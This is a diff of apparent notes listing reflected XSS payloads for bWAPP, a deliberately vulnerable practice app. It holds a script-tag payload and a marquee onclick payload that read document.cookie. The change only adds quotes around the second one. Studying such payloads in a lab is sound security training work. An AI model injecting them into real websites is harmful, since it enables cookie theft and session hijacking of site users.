@@ -52,6 +52,6 @@ XSS - Reflected (CustomHeader)(Low)
 Payload- bWAPP:<script>alert(document.cookie)</script>
 
 XSS - Reflected (CustomHeader)(Medium)
-Payload – bWAPP:<marquee onclick=alert(document.cookie)>click to win 1$</marquee>
+Payload – bWAPP:'<marquee onclick=alert(document.cookie)>click to win 1$</marquee>'
 
 
